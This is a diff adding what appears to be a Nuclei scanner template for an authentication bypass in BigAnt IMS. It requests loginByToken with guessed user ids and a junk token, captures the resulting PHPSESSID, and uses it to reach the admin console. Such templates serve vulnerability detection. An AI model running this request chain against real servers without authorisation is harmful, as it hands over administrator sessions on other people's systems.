@@ -1,0 +1,53 @@
+id: poc-jiuqitech-bigant-login-token-bypass
+info:
+  name: BigAnt IMS LoginByToken Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+  description: |
+    Exploits a login bypass vulnerability in the BigAnt Instant Messaging System's loginByToken functionality.
+
+flow: http(1) && http(2)
+
+http:
+  - id: login-by-token
+    method: GET
+    path:
+      - "{{BaseURL}}/home/login/loginByToken?uid=1&token=asdasdasdadasadad"
+      - "{{BaseURL}}/home/login/loginByToken?uid=2&token=asdasdasdadasadad"
+      - "{{BaseURL}}/home/login/loginByToken?uid=3&token=asdasdasdadasadad"
+      - "{{BaseURL}}/home/login/loginByToken?uid=4&token=asdasdasdadasadad"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Location: /Admin/index/index"
+    extractors:
+      - type: regex
+        name: phpsessid
+        part: header
+        group: 1
+        regex:
+          - "PHPSESSID=(.*?);"
+        internal: true
+
+  - id: admin-access
+    method: GET
+    path:
+      - "{{BaseURL}}/Admin/index/index"
+    headers:
+      Cookie: PHPSESSID={{phpsessid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "即时通讯 系统管理"
+          - "修改个人信息"
